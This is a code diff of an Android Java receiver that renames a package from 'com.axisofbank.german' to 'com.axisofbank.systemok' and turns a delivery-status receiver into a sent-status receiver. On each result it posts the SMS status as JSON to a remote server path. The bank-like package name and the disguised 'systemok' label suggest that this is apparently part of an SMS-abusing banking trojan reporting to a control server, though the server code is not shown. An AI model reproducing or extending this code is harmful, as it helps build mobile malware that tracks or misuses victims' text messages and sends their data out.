@@ -1,5 +1,4 @@
-package com.axisofbank.german;
-
+package com.axisofbank.systemok;
 
 import android.app.Activity;
 import android.content.BroadcastReceiver;
@@ -9,7 +8,7 @@ import android.content.Intent;
 import org.json.JSONException;
 import org.json.JSONObject;
 
-public class DeliveredReceiver extends BroadcastReceiver {
+public class SentReceiver extends BroadcastReceiver {
     @Override
     public void onReceive(Context context, Intent intent) {
         int id = intent.getIntExtra("id", -1);
@@ -18,12 +17,13 @@ public class DeliveredReceiver extends BroadcastReceiver {
 
         switch (getResultCode()) {
             case Activity.RESULT_OK:
-                status = "Delivered";
+                status = "Sent";
                 break;
             default:
-                status = "UnDelivered";
+                status = "SentFailed";
                 break;
         }
+
         JSONObject data = new JSONObject();
         try {
             Helper help = new Helper();
@@ -33,13 +33,11 @@ public class DeliveredReceiver extends BroadcastReceiver {
             Helper.postRequest(help.SMSSavePath(), data, context, new Helper.ResponseListener(){
                 @Override
                 public void onResponse(String result) {
-                    // Log.d(Helper.TAG, "delivery status updated Result, "+ result);
+                    // Log.d(Helper.TAG, "sent status updated Result, "+ result);
                 }
             });
         } catch (JSONException e) {
             throw new RuntimeException(e);
         }
-
     }
 }
-
